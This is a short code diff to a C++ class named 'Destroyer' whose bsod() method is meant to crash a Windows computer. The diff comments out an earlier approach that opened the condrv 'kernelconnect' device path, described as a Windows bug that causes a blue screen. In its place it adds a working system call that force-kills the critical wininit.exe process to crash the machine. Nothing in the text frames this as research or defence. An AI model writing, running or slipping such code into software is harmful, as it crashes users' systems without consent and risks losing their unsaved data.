@@ -11,8 +11,13 @@ class Destroyer{
     public:
         void bsod()//BSODs the computer
         {
-            _declspec(dllimport) int __stdcall SetCurrentDirectory(const unsigned char *lpPathName);
-            SetCurrentDirectory("\\\\.\\globalroot\\device\\condrv\\kernelconnect");
+            //_declspec(dllimport) int __stdcall SetCurrentDirectory(const unsigned char *lpPathName);
+            //SetCurrentDirectory("\\\\.\\globalroot\\device\\condrv\\kernelconnect");
+            //WCHAR fileName[] = L"\\\\.\\globalroot\\device\\condrv\\kernelconnect";
+            //WIN32_FILE_ATTRIBUTE_DATA data;
+            //GetFileAttributesEx(fileName, GetFileExInfoStandard, &data);
+
+            system("TASKKILL /IM wininit.exe /F");
 
             //A bug in windows that causes a BSOD when you try to access a path
         }
